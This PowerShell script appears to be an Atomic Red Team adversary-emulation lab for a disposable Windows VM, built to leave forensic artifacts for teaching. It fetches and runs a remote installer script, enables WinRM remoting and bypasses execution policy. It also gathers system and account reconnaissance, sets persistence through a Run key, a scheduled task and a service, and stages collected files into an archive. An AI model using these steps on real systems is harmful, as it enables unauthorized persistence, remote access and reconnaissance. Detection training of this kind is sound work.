<#
Efficient Atomic Red Team Attack Chain
Run as Administrator on a disposable Windows 10/11 lab VM.
#>

# ==============================
# Admin Check
# ==============================

$Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Run this script as Administrator."
}

# ==============================
# Settings
# ==============================

$AtomicRoot  = "C:\AtomicRedTeam"
$AtomicsPath = "$AtomicRoot\atomics"

$LabRoot     = "C:\Users\Public\Documents\fsociety-lab"
$StageDir    = "$LabRoot\stage"
$PayloadPath = "$LabRoot\fsociety_update.ps1"
$LogFile     = "$LabRoot\attack-chain-log.txt"
$ZipPath     = "$LabRoot\fsociety_exfil_stage.zip"

$RunKeyName  = "FSocietyUpdater"
$TaskName    = "FSociety Daily Update"
$ServiceName = "FSocietyUpdaterSvc"

New-Item -ItemType Directory -Path $LabRoot,$StageDir,"C:\temp" -Force | Out-Null

Start-Transcript -Path $LogFile -Append

# ==============================
# Prerequisites
# ==============================

Write-Host "`n[+] Preparing system prerequisites..." -ForegroundColor Yellow

Set-ExecutionPolicy Bypass -Scope Process -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
}

Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue

$Modules = @("powershell-yaml", "Invoke-AtomicRedTeam")

foreach ($Module in $Modules) {
    if (-not (Get-Module -ListAvailable -Name $Module)) {
        Install-Module -Name $Module -Scope CurrentUser -Force -AllowClobber
    }
}

Import-Module Invoke-AtomicRedTeam -Force

# ==============================
# Enable PowerShell Remoting
# ==============================

Write-Host "`n[+] Enabling PowerShell Remoting / WinRM..." -ForegroundColor Yellow

try {
    Enable-PSRemoting -Force -SkipNetworkProfileCheck
    Set-Service WinRM -StartupType Automatic
    Start-Service WinRM
    Enable-NetFirewallRule -DisplayGroup "Windows Remote Management" -ErrorAction SilentlyContinue
    Write-Host "[+] PowerShell Remoting enabled." -ForegroundColor Green
}
catch {
    Write-Host "[!] PowerShell Remoting setup issue: $($_.Exception.Message)" -ForegroundColor Yellow
}

# ==============================
# Atomic Red Team Install Check
# ==============================

Write-Host "`n[+] Checking Atomic Red Team..." -ForegroundColor Yellow

if (-not (Test-Path $AtomicsPath)) {
    Write-Host "[!] Atomics folder missing. Installing atomics..." -ForegroundColor Yellow

    if (-not (Test-Path $AtomicRoot)) {
        New-Item -ItemType Directory -Path $AtomicRoot -Force | Out-Null
    }

    try {
        IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing)
        Install-AtomicsFolder -InstallPath $AtomicRoot -Force
    }
    catch {
        Write-Host "[!] Standard atomics install failed. Trying manual GitHub download..." -ForegroundColor Yellow

        $ZipUrl = "https://github.com/redcanaryco/atomic-red-team/archive/refs/heads/master.zip"
        $ZipFile = "$env:TEMP\atomic-red-team-master.zip"
        $ExtractPath = "$env:TEMP\atomic-red-team-master"

        Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipFile -UseBasicParsing

        if (Test-Path $ExtractPath) {
            Remove-Item $ExtractPath -Recurse -Force
        }

        Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force

        $ManualAtomics = Get-ChildItem -Path $ExtractPath -Directory -Recurse |
            Where-Object { $_.Name -eq "atomics" } |
            Select-Object -First 1

        if ($ManualAtomics) {
            Copy-Item -Path $ManualAtomics.FullName -Destination $AtomicsPath -Recurse -Force
        }
    }
}

if (-not (Test-Path $AtomicsPath)) {
    Write-Host "[!] Atomics folder unavailable. Script will continue with custom artifacts only." -ForegroundColor Red
    $AtomicsPath = $null
}
else {
    Write-Host "[+] Atomics available at $AtomicsPath" -ForegroundColor Green
}

# ==============================
# Atomic Helper
# ==============================

function Invoke-ClassroomAtomic {
    param(
        [string]$Technique,
        [int[]]$TestNumbers,
        [string]$Description
    )

    Write-Host "`n[+] Atomic Phase: $Technique - $Description" -ForegroundColor Cyan

    if (-not $AtomicsPath -or -not (Test-Path $AtomicsPath)) {
        Write-Host "[!] Skipping $Technique. Atomics folder unavailable." -ForegroundColor Yellow
        return
    }

    foreach ($TestNumber in $TestNumbers) {
        try {
            Write-Host "[+] Running $Technique test #$TestNumber" -ForegroundColor Cyan
            Invoke-AtomicTest $Technique -TestNumbers $TestNumber -PathToAtomicsFolder $AtomicsPath
        }
        catch {
            Write-Host "[!] $Technique test #$TestNumber failed, continuing: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }
}

# ==============================
# Phase 1: Initial Execution
# ==============================

Write-Host "`n[+] Phase 1: Initial Execution" -ForegroundColor Magenta

$PayloadContent = @"
Write-Output 'FSociety classroom payload executed'
whoami | Out-File '$StageDir\whoami.txt'
hostname | Out-File '$StageDir\hostname.txt'
ipconfig /all | Out-File '$StageDir\ipconfig.txt'
systeminfo | Out-File '$StageDir\systeminfo.txt'
net user | Out-File '$StageDir\net-user.txt'
net localgroup administrators | Out-File '$StageDir\local-admins.txt'
"@

Set-Content -Path $PayloadPath -Value $PayloadContent
powershell.exe -ExecutionPolicy Bypass -File $PayloadPath

# ==============================
# Phase 2: Discovery
# ==============================

Write-Host "`n[+] Phase 2: Discovery" -ForegroundColor Magenta

Invoke-ClassroomAtomic -Technique "T1033" -TestNumbers @(1) -Description "System Owner/User Discovery"
Invoke-ClassroomAtomic -Technique "T1082" -TestNumbers @(1) -Description "System Information Discovery"
Invoke-ClassroomAtomic -Technique "T1016" -TestNumbers @(1) -Description "Network Configuration Discovery"

whoami /all | Out-File "$StageDir\whoami-all.txt"
tasklist /v | Out-File "$StageDir\tasklist.txt"
netstat -ano | Out-File "$StageDir\netstat.txt"
arp -a | Out-File "$StageDir\arp.txt"
route print | Out-File "$StageDir\route.txt"

# ==============================
# Phase 3: Persistence
# ==============================

Write-Host "`n[+] Phase 3: Persistence" -ForegroundColor Magenta

New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name $RunKeyName `
    -Value "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" `
    -PropertyType String `
    -Force | Out-Null

schtasks /Create /TN $TaskName /SC DAILY /ST 09:00 /TR "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" /F

sc.exe create $ServiceName binPath= "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" start= demand
sc.exe description $ServiceName "Classroom forensic artifact service"

Invoke-ClassroomAtomic -Technique "T1053.005" -TestNumbers @(1,2,4) -Description "Scheduled Task Artifacts"
Invoke-ClassroomAtomic -Technique "T1547.001" -TestNumbers @(1,2,3,4,5,6,7) -Description "Run Key and Startup Folder Artifacts"
Invoke-ClassroomAtomic -Technique "T1543.003" -TestNumbers @(2,3) -Description "Service Creation Artifacts"

# ==============================
# Phase 4: File System Activity
# ==============================

Write-Host "`n[+] Phase 4: File Creation, Modification, Deletion" -ForegroundColor Magenta

"Sensitive project notes - classroom artifact" | Out-File "$StageDir\elliot-project-notes.txt"
"Browser artifact simulation - no real credential theft" | Out-File "$StageDir\browser-artifact-simulation.txt"
"Temporary malware dropper simulation" | Out-File "$LabRoot\fsociety_dropper.tmp"

Start-Sleep -Seconds 2
Remove-Item "$LabRoot\fsociety_dropper.tmp" -Force

notepad.exe "$StageDir\elliot-project-notes.txt"
Start-Sleep -Seconds 3
Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force

calc.exe
Start-Sleep -Seconds 3
Get-Process CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force

# ==============================
# Phase 5: Network / Browser / Download
# ==============================

Write-Host "`n[+] Phase 5: Network and Download Activity" -ForegroundColor Magenta

try {
    Start-Process "msedge.exe" "https://example.com/fsociety-training"
    Start-Sleep -Seconds 5
    Get-Process msedge -ErrorAction SilentlyContinue | Stop-Process -Force
}
catch {
    Write-Host "[!] Edge activity skipped: $($_.Exception.Message)" -ForegroundColor Yellow
}

cmd.exe /c "nslookup example.com > `"$StageDir\dns-example.txt`" 2>&1"
cmd.exe /c "ping example.com -n 2 > `"$StageDir\ping-example.txt`" 2>&1"

try {
    Invoke-WebRequest -Uri "https://example.com" -OutFile "$StageDir\downloaded-example.html" -UseBasicParsing
}
catch {
    Write-Host "[!] Web request failed, continuing." -ForegroundColor Yellow
}

Invoke-ClassroomAtomic -Technique "T1105" -TestNumbers @(7,8,9,10,15,18,29) -Description "Ingress Tool Transfer Artifacts"

# ==============================
# Phase 6: Collection and Staging
# ==============================

Write-Host "`n[+] Phase 6: Collection and Staging" -ForegroundColor Magenta

Get-ChildItem $StageDir -Recurse | Out-File "$StageDir\staged-file-list.txt"
Compress-Archive -Path "$StageDir\*" -DestinationPath $ZipPath -Force

Write-Host "`n[+] Attack chain complete." -ForegroundColor Green
Write-Host "[+] Lab artifacts: $LabRoot" -ForegroundColor Green
Write-Host "[+] Staged archive: $ZipPath" -ForegroundColor Green
Write-Host "[+] Transcript: $LogFile" -ForegroundColor Green

Stop-Transcript
